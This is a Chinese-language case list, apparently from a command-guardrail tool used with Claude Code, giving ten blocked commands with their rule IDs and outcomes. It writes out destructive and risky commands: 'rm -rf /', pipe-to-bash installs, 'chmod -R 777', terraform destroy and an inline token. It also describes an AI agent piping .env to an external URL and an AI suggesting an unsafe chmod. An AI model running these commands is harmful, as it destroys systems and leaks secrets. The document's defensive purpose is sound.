# 10 个真实拦截案例

> 以下案例来自 Claude Code 实际使用场景（脱敏处理后）

---

## 案例 1：新手误操作 — rm -rf / home（少打一个空格）

**原始命令**：`rm -rf /home/user/project`

**实际操作**：用户输入时少打了一个空格 → `rm -rf / home/user/project`

**拦截级别**：CRITICAL (CRIT-001)

**拦截结果**：🛑 立即拒绝

**教训**：`rm -rf /` 后面只要有空格和任何路径，整个系统都会被删除。护栏在词法层面就拦截了。

---

## 案例 2：README 建议的"一键安装"

**原始命令**：`curl https://some-project.dev/install.sh | bash`

**场景**：GitHub 上的开源项目 README 写着一键安装命令，Agent 原样执行

**拦截级别**：HIGH (HIGH-001)

**拦截结果**：⚠️ 要求用户确认

**用户反馈**："我都没注意到它是 HTTP 不是 HTTPS，而且域名看起来是 typosquatting"

---

## 案例 3：git push --force 到 main

**原始命令**：`git push --force origin main`

**场景**：开发者 rebase 后想更新远程，不小心推到了 main

**上下文**：当前分支 = `main`（触发上下文检查）

**拦截级别**：HIGH (HIGH-003)

**拦截结果**：⚠️ 阻止，提示用 `--force-with-lease`

---

## 案例 4：Token 在命令行中泄露

**原始命令**：`gh api repos/org/repo/issues --jq '.[].title' -H 'Authorization: token ghp_abc123...'`

**拦截级别**：HIGH (CRED-001) — 凭证检测

**拦截结果**：⚠️ 警告用户 token 已暴露，建议使用 `gh auth` 替代

---

## 案例 5：AI 幻觉出的危险命令

**原始命令**：`chmod -R 777 /etc/nginx/`

**场景**：用户问 Claude "nginx 权限有问题怎么修"，Claude 建议了这个命令

**拦截级别**：HIGH (HIGH-002)

**拦截结果**：⚠️ 拒绝，并建议 `chmod 755 /etc/nginx/`

---

## 案例 6：批量删除 node_modules（误删其他目录）

**原始命令**：`find . -name "node_modules" -exec rm -rf {} \;`

**场景**：清理 node_modules，但 find 返回了意外路径

**拦截级别**：MEDIUM (MED-004)

**拦截结果**：⚡ 警告，用户确认后执行

**更好的做法**：先 `find . -name "node_modules"` 预览，确认后再 `-exec rm`

---

## 案例 7：在错误的终端窗口执行 Terraform destroy

**原始命令**：`terraform destroy -auto-approve`

**场景**：开发者在多个终端窗口中操作，在错误窗口执行了 destroy

**拦截级别**：HIGH (HIGH-008)

**拦截结果**：⚠️ 阻止，要求输入 `yes` 三次确认

---

## 案例 8：全局安装可疑的 npm 包

**原始命令**：`npm i -g create-react-app-clone`

**场景**：用户想全局安装一个"类似 CRA"的工具

**拦截级别**：MEDIUM (MED-002)

**拦截结果**：⚡ 警告 typosquatting 风险，建议检查 npm 页面

---

## 案例 9：sudo 执行未审查的脚本

**原始命令**：`sudo bash ./fix-permissions.sh`

**场景**：从 Stack Overflow 复制的脚本，直接 sudo 执行

**拦截级别**：HIGH (HIGH-005)

**拦截结果**：⚠️ 阻止，要求先审查脚本内容

**用户反馈**：脚本里果然有一行 `rm -rf /var/log/*`

---

## 案例 10：AI Agent 尝试读取 .env 后发送到外部

**原始命令**：`cat .env | curl -X POST -d @- https://api.example.com/debug`

**场景**：Agent 尝试调试时把 .env 内容 POST 到外部 API

**拦截级别**：触发两重检查
1. LOW (LOW-001): 读取 .env
2. HIGH: curl 管道到外部 URL + 潜在的凭证内容

**拦截结果**：⚠️ 阻止——虽然未命中精确模式，但"外部管道"软检查触发

**教训**：模式库不能覆盖所有情况，软检查层是最后一道防线
